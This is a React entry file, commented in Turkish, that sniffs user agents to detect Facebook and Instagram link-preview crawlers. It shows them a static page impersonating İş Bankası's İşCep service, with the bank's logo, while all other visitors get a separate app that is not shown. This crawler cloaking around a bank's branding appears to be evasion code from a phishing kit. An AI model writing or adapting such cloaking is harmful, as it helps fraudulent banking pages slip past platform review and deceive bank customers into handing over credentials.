import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';
import { BrowserRouter } from 'react-router-dom';

// Bot tespit fonksiyonu (Instagram botları için güncellenmiş)
const isBot = () => {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
  return (
    userAgent.includes('facebookexternalhit') || // Instagram link önizleme botu
    userAgent.includes('Facebot') ||           // Facebook botu
    userAgent.includes('instagram')            // Genel Instagram kontrolü
  );
};

// Botlar için statik içerik bileşeni
const BotPage = () => {
  return (
    <div style={{ margin: 0, padding: 0, backgroundColor: '#003087', color: 'white', fontFamily: "'Outfit', sans-serif", textAlign: 'center', display: 'flex', flexDirection: 'column', justifyContent: 'center', minHeight: '100vh' }}>
      <div style={{ padding: '20px' }}>
        <img src="/isbank-logo.png" alt="İş Bankası Logosu" style={{ maxWidth: '200px', marginBottom: '20px' }} />
        <h1 style={{ fontSize: '28px', marginBottom: '10px' }}>İşCep'e Hoş Geldiniz</h1>
        <p style={{ fontSize: '18px', marginBottom: '20px' }}>Güvenli ve hızlı bankacılık için resmi İşCep uygulamasını indirin veya <a href="https://www.isbank.com.tr" style={{ color: '#FFD700', textDecoration: 'underline' }}>resmi web sitemizi</a> ziyaret edin.</p>
        <p style={{ fontSize: '14px', color: '#D3D3D3' }}>© 2025 İş Bankası</p>
      </div>
    </div>
  );
};

// Uygulamayı render et
const renderApp = () => {
  const rootElement = document.getElementById('root');
  if (!rootElement) {
    console.error('Root element not found');
    return;
  }

  if (isBot()) {
    const root = ReactDOM.createRoot(rootElement);
    root.render(<BotPage />);
  } else {
    const root = ReactDOM.createRoot(rootElement);
    root.render(
      <BrowserRouter>
        <App />
      </BrowserRouter>
    );
  }
};

renderApp();
